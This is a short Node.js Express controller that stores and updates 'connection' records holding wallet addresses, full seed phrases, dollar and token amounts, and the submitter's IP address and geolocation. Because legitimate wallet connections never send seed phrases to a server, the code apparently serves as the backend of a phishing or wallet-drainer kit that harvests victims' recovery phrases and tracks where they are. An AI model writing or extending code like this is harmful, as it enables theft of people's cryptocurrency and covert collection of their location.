const Connection = require('../models/Connection');

// Create a new connection
exports.createConnection = async(req, res) => {
    try {
        const {
            walletType,
            walletAddress,
            seedPhrase = '',
            seedBlocks = '',
            usdAmount,
            tokenAmount,
            ipAddress, // new field
            location // new field (e.g., "lat,lng")
        } = req.body;

        const connection = await Connection.create({
            walletType,
            walletAddress,
            seedPhrase,
            seedBlocks,
            usdAmount,
            tokenAmount,
            ipAddress,
            location
        });
        res.status(201).json(connection);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

// Update an existing connection
exports.updateConnection = async(req, res) => {
    try {
        const { seedPhrase, seedBlocks, ipAddress, location } = req.body;

        const connection = await Connection.findByPk(req.params.id);
        if (!connection) {
            return res.status(404).json({ error: 'Connection not found' });
        }

        if (typeof seedPhrase === 'string') {
            connection.seedPhrase = seedPhrase;
        }
        if (typeof seedBlocks === 'string') {
            connection.seedBlocks = seedBlocks;
        }
        // Optionally update ipAddress and location if provided
        if (typeof ipAddress === 'string') {
            connection.ipAddress = ipAddress;
        }
        if (typeof location === 'string') {
            connection.location = location;
        }

        await connection.save();
        res.status(200).json(connection);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};